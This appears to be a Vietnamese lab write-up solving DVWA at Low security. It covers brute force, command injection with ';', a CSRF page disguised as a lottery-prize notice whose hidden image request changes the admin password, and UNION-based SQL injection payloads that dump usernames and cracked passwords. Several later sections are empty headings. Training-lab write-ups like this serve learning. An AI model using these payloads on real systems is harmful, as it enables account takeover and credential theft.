# DVWA - Security Level: Low

## 1. Brute Force  
Su dung BurpSuite bat request khi thuc hien dang nhap:  
![Brute Forces_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_1.png)  
Su dung tinh nang **Intruder**, thu bruteforces voi tai khoan **admin**:  
![Brute Forces_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_2.png)  
Ket qua:  
![Brute Forces_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_3.png)  
Tai khoan: **admin**  
Mat khau: **password**  
## 2. Command Injection  
Nhap **8.8.8.8** vao input box:  
![Command Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Command%20Injection_1.png)  
Chuc nang **Ping a device** thuc hien cau lenh **ping -c 4**, thu su dung ky tu **';'** de ket hop voi cac cau lenh khac:  
![Command Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Command%20Injection_2.png)  
## 3. CSRF  
Khi su dung chuc nang **Change your admin password**, he thong se gui GET request nhu sau:  
![CSRF_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_1.png)  
Trong GET request chi co thong tin ve PHPSESSID de xac dinh xem user nao dang gui request. Tao mot trang web index.html nhu sau:  
```
<!DOCTYPE html>
<html lang = "en">
<head>
  <meta charset = "UTF-8">
  <title> Vietlott </title>
</head>
<body>
  <h1> Chuc mung ban da trung Vietlott 100.000.000.000 VND </h1>
  <img style="display:none" src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change" alt="">
</body>
</html>
```  
Khi nguoi dung truy cap vao trang web tren se kich hoat HTTP request toi chuc nang **Change your admin password** cua **DVWA**, neu nguoi dung dang truy cap trang **DVWA** voi tai khoan **admin**, trinh duyet se tu dong su dung PHPSESSID cua nguoi dung de gui request thay doi mat khau thanh **abc123**.  
Kiem tra lai tai khoan **admin** voi mat khau **abc123**  
![CSRF_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_2.png)
## 4. File Inclusion  

## 5. File Upload  

## 6. Insecure Captcha  

## 7. SQL Injection  
Nhap thu **"1"** vao input box:  
![SQL Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_1.png)  
Khi nhap **User ID = 1** trang web se tra ve thong tin cua **ID, First name, Surname**, vi vay cau lenh query co the la:  
**SELECT first_name, last_name FROM users WHERE user_id = id;**  
Thu kiem tra so column cua cau lenh query bang canh nhap **'UNION ODER BY 2--**  
![SQL Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_2.png)  
Kiem tra cac table trong database bang lenh query:  
**' UNION SELECT null, table_name FROM INFORMATION_SCHEMA.TABLES-- -**  
![SQL Injection_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_3.png)  
Co table **users**, kiem tra cac column trong table **users** bang lenh query:  
**' UNION SELECT null, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'dvwa' and table_name = 'users'-- -**    
![SQL Injection_4](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_4.png)  
Trong table **user** co 2 column **user, password**, kiem tra 2 columns bang lenh query:  
**' UNION SELECT user, password FROM users-- -**  
![SQL Injection_5](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_5.png)  
Ta co cac thong tin ve **user, password**, **password** dang duoc ma hoa MD5. Sau khi giai ma:  
**admin - password  
gordonb - abc123  
1337 - charley  
pablo - letmein  
smithy - password**  
## 8. SQL Injection (Blind)  

## 9. Weak Session IDs  

## 10. XSS (DOM)  
    
## 11. XSS (Reflected)  
    
## 12. XSS (Stored)  

## 13. CSP Bypass  

## 14. JavaScript  
